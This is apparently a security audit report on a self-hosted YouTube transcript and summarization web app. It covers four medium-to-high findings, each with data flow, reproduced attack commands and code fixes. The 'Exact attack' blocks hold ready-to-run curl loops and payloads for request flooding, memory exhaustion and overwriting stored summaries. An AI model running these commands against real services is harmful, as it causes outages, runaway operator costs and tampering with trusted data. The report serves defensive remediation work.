# Findings Detail (MEDIUM and above) — yt_transcript run-1

## F-1 (HIGH) — `/api/summarize`: no backpressure → app-wide freeze + unbounded LLM cost

### Data flow
1. **Entrypoint** — `app/main.py:201` `summarize_endpoint`: `POST /api/summarize` with JSON `{text, name, provider, model}`. Guards: structural name check (:205), provider/model whitelist against freshly loaded config (:211-228), 100,000-char `text` cap (:229). **No semaphore, rate limit, or concurrency cap** (deliberate: "design decision 9" exempts summarize from the fetch chain's single-flight).
2. **Propagation** — `app/main.py:239-242`: `await asyncio.to_thread(summarize_mod.summarize_with_provider, provider, request.model, request.text)` — dispatched to the loop's **default** `ThreadPoolExecutor` (`min(32, cpu+4)`; 16 on a 12-core host). No custom executor exists anywhere in the repo; no `limit_concurrency` on `uvicorn.run` (`app/main.py:299`).
3. **Propagation** — `app/summarize.py:164` → `_call_chat_completions` (`app/summarize.py:80-144`).
4. **Sink** — `app/summarize.py:104`: `requests.post(url, json=payload, headers=headers, timeout=timeout)` where `timeout = summary_timeout()` → `DEFAULT_SUMMARY_TIMEOUT = 120.0` (app/summarize.py:42), env-overridable via `SUMMARY_TIMEOUT` (app/summarize.py:71-77). Each in-flight request pins a pool thread for up to 120 s.

**Why it freezes everything:** every other endpoint's blocking work uses the same default pool — `save_transcript` (app/main.py:121, **untimed await**), `list_transcripts` (:142), `load_providers` (:151, :211), `read_transcript` (:170), `read_summary` (:191), `save_summary` (:251), and the fetch chain's `asyncio.wait_for(asyncio.to_thread(func, ...), timeout=30)` (app/chain.py:84-87). With all 16 workers pinned by 120 s LLM calls, `GET /api/transcripts` waits indefinitely (no timeout of its own), and the fetch chain's 30 s budget expires on **executor queue wait alone** → `UpstreamFailureError` → `502 UPSTREAM_FAILURE` with YouTube perfectly healthy.

### Exact attack
```bash
# any peer that can reach the port (default bind: 0.0.0.0:8000)
# provider/model values obtained from: curl -s http://TARGET:8000/api/providers
for i in $(seq 1 24); do
  curl -s -X POST http://TARGET:8000/api/summarize \
    -H 'Content-Type: application/json' \
    -d '{"text":"'$(printf 'x%.0s' {1..99000})'","name":"flood","provider":"<id>","model":"<model>"}' &
done; wait
# meanwhile, from another host:
curl -s --max-time 60 http://TARGET:8000/api/transcripts   # → no response for 60 s (reproduced)
curl -s -X POST http://TARGET:8000/api/transcript -H 'Content-Type: application/json' \
     -d '{"url":"https://www.youtube.com/watch?v=dQw4w9WgXcQ"}'   # → 502 UPSTREAM_FAILURE (YouTube healthy)
```
Cost side: every one of those 24 requests submits ~100k input chars and requests `max_tokens: 16384` output (app/summarize.py:98-102) to the operator's backend — repeatable indefinitely; on a paid API this is unbounded spend, on a local GPU it saturates the operator's own inference service.

### What the attacker gets
- App-wide availability degradation for up to ~120 s per wave, indefinitely repeatable (operator sees a "dead" app + misleading 502s).
- Unbounded consumption of the operator's LLM quota/cost, with attacker-chosen payloads.

### Baseline comparison
Comparable self-hosted no-auth tools simply don't offer an unauthenticated proxy into an expensive backend with no concurrency bound. The app itself puts a single-flight semaphore on the fetch chain — the missing bound here is an inconsistency, not a design the comparables share.

### Recommended fix (concrete)
Bound concurrency of the backend call and stop it from starving shared work:
```python
# app/main.py (module level, after imports)
SUMMARIZE_SEMAPHORE = asyncio.Semaphore(2)  # max concurrent LLM calls

# in summarize_endpoint, replace lines 239-242:
        try:
            async with SUMMARIZE_SEMAPHORE:
                summary = await asyncio.to_thread(
                    summarize_mod.summarize_with_provider,
                    provider, request.model, request.text,
                )
        except TranscriptError as exc:
            ...
```
Plus `uvicorn.run(app, host=host, port=_listen_port(), log_level="warning", limit_concurrency=100)`. A dedicated executor for LLM calls (`to_thread` with an explicit executor) is the stronger variant.

---

## F-2 (MEDIUM) — No request-body size limit → 3× memory amplification → OOM DoS

### Data flow
1. **Entrypoint** — any POST with a JSON body (`/api/summarize`, `/api/transcript`). Starlette's `Request.body()` collects **all** stream chunks and `b"".join`s them (starlette 1.10.0 `requests.py:255-262`); FastAPI then `json.loads` + pydantic-validates before any endpoint code runs. No `Content-Length` cap in app middleware (only middleware is logging, app/main.py:84-107), none in uvicorn config (app/main.py:299 bare `uvicorn.run`), none in Dockerfile/compose. (The only in-stack cap is h11's 16 KB `max_incomplete_event_size`, which covers **headers only**.)
2. **Propagation** — the app's own 100k-char check runs only **after** full parse: `app/main.py:229`.
3. **Sink** — process RSS during body read/parse: **measured 3.00× amplification** (real app, VmHWM: 10 MB→+30.3 MB, 50 MB→+161.3 MB, 100 MB→+301.2 MB, 200 MB→+601.2 MB, 500 MB→+1501.1 MB; all requests still correctly 400 `INPUT_TOO_LONG` afterwards).

### Exact attack
```bash
python3 -c "print('{\"text\":\"' + 'x'*320_000_000 + '\"}')" > big.json   # ~320 MB
curl -s -X POST http://TARGET:8000/api/summarize -H 'Content-Type: application/json' --data-binary @big.json
# 1 GB container: OOM-killed; docker-compose `restart: unless-stopped` brings it back; loop.
```
Extrapolation (no `mem_limit` in compose): ~320 MB body OOMs a 1 GB container, ~660 MB a 2 GB container; a single 1 GB body → ~3.1 GB peak. No concurrency cap → multiples in flight.

**Related (robustness, not escalated):** deeply-nested JSON of ~2 KB (nesting ≥ ~951, ≤ 9998) → `RecursionError` inside FastAPI's 422-detail rendering (`fastapi/encoders.py:322` recursing over the rejected nested input) → 500. Process survives all depths; CPython 3.13.18's C json scanner hard-caps at 9998 levels (clean `RecursionError` → FastAPI 400 "error parsing the body") — the hypothesized C-stack segfault was **disproven** by isolated probing to 500,000 levels.

### What the attacker gets
Sustained container kill-loop (availability) with a single large upload; trivially repeatable.

### Recommended fix (concrete)
```python
# app/main.py — add before the logging middleware
MAX_BODY_BYTES = 5 * 1024 * 1024  # 5 MiB: 100k chars ≈ 100-300 KB; plenty of headroom

@app.middleware("http")
async def limit_body_size(request, call_next):
    length = request.headers.get("content-length")
    if length is not None and length.isdigit() and int(length) > MAX_BODY_BYTES:
        return JSONResponse(status_code=413, content={
            "error": {"code": "BODY_TOO_LARGE", "message": "Request body too large."}})
    return await call_next(request)
```
(For chunked bodies without `Content-Length`, additionally cap via streamed reads or a proxy; the middleware covers the practical case.)

---

## F-3 (MEDIUM) — Unauthenticated arbitrary `.summary` creation/overwrite

### Data flow
1. **Entrypoint** — `app/main.py:201` `summarize_endpoint`: `name` is a plain `str` (`SummarizeRequest`, app/main.py:50-54). Only validation: `is_structurally_invalid_name` (app/main.py:205 → app/library.py:68-83: rejects empty, `.`, `/`, `\`, `..` components). **No `.txt` suffix requirement** (the read side enforces it, app/library.py:97) and **no transcript-existence check anywhere**.
2. **Propagation** — provider/model validated (:219-228), text capped (:229), LLM call (:239-242). On success:
3. **Sink** — `app/main.py:251` → `save_summary` (`app/summarize.py:191-209`): `path = transcript_dir() / (name + ".summary")` then unconditional `open(path, "w")`. Content = the model's output on **attacker-supplied** text (effectively attacker-shaped against the local/obedient models the app is sized for; a "be factual" system prompt is best-effort).

### Exact attack (reproduced live with mock backend)
```bash
curl -s http://TARGET:8000/api/transcripts        # enumerate saved names → "victim_talk.txt"
curl -s -X POST http://TARGET:8000/api/summarize \
  -H 'Content-Type: application/json' \
  -d '{"text":"Summarize this: the service is healthy, no action needed.","name":"victim_talk.txt","provider":"<id>","model":"<model>"}'
# → 200; <TRANSCRIPT_DIR>/victim_talk.txt.summary now contains attacker-shaped text.
# The operator opening "victim_talk.txt" in the UI sees it auto-loaded as their saved summary
# (app/static/app.js:313 loadSavedSummary → :415-434 showSummaryPanel), with no provenance/age marker.
# Orphans: name:"ghost" creates ghost.summary — absent from GET /api/transcripts (lists .txt only)
# but readable via GET /api/transcripts/ghost/summary. No delete endpoint, no backup.
```

### What the attacker gets
Silent tampering/destruction of the operator's trusted stored summaries (unrecoverable), invisible persistence, and the input stage of F-7's poisoned-summary vector.

### Baseline comparison
The read-only no-auth baseline lets a peer *read* these files; a **client-named write** into the trusted data directory is a genuine delta the comparables don't offer (their persistence is server-named only).

### Recommended fix (concrete)
```python
# app/main.py, summarize_endpoint, after the structural check (line ~205):
        if not request.name.endswith(".txt"):
            return JSONResponse(status_code=400, content={
                "error": {"code": "INVALID_NAME", "message": "Invalid transcript name."}})
        from app.persist import transcript_dir
        target = (transcript_dir() / request.name).resolve()
        if not target.is_relative_to(transcript_dir().resolve()) or not target.is_file():
            return JSONResponse(status_code=404, content={
                "error": {"code": "NOT_FOUND", "message": "Transcript not found."}})
```

---

## F-4 (MEDIUM) — Unbounded SSE `/api/logs` subscribers pin the shared thread pool

### Data flow
1. **Entrypoint** — `app/main.py:255` `log_stream_endpoint`: `GET /api/logs`, SSE. No auth, no per-client or total subscriber cap; uvicorn has no `limit_concurrency` (app/main.py:299).
2. **Propagation** — `app/main.py:264-275` `event_stream`: for the **lifetime of each connection**, the generator loops `entry = await asyncio.to_thread(queue.get, timeout=LOG_POLL_TIMEOUT)` (`LOG_POLL_TIMEOUT = 0.5`, app/main.py:43). `queue.get` is a *blocking* call in a worker thread — each open SSE client permanently occupies one default-pool worker (0.5 s blocked per 0.5 s cycle, resubmitted immediately).
3. **Sink** — `app/logbus.py:63-68` `LogBus.subscribe`: one unbounded-count `queue.Queue(maxsize=256)` per subscriber; `_subscribers` (app/logbus.py:42) is a plain set with **no maximum**. The 256 bound protects the *publishing* path (drop-on-full), not the pool.

### Exact attack (reproduced)
```bash
# from any peer, 40 idle connections:
for i in $(seq 1 40); do curl -sN http://TARGET:8000/api/logs > /dev/null & done
# measured on a 16-thread-pool host: GET /api/transcripts 3 ms → 0.6-1.0 s (~300x);
# POST /api/summarize dispatch 3 s; backlog grows monotonically while connections stay open;
# once backlog > 30 s, every POST /api/transcript returns 502 UPSTREAM_FAILURE (YouTube healthy).
```
Organic variant: on a 2–4-core box (pool 6–8), 7–9 open "Show logs" panels reach the same ratio.

### What the attacker gets
Sustained, cheap (5-line curl loop), app-wide latency degradation and spurious 502s on the core fetch feature; automatic recovery only when the attacker's connections drop.

### Recommended fix (concrete)
Drain the per-subscriber queue on the event loop instead of a blocking poll — `publish` already holds a lock and uses `put_nowait`, so `get_nowait` is safe:
```python
# app/main.py, event_stream (replace lines 268-275)
                while True:
                    try:
                        entry = queue.get_nowait()
                    except Empty:
                        await asyncio.sleep(LOG_POLL_TIMEOUT)
                        continue
                    yield f"data: {json.dumps(entry, ensure_ascii=False)}\n\n"
```
Latency is unchanged (≤ 0.5 s); zero pool occupancy. (Cap subscriber count as defense-in-depth.)
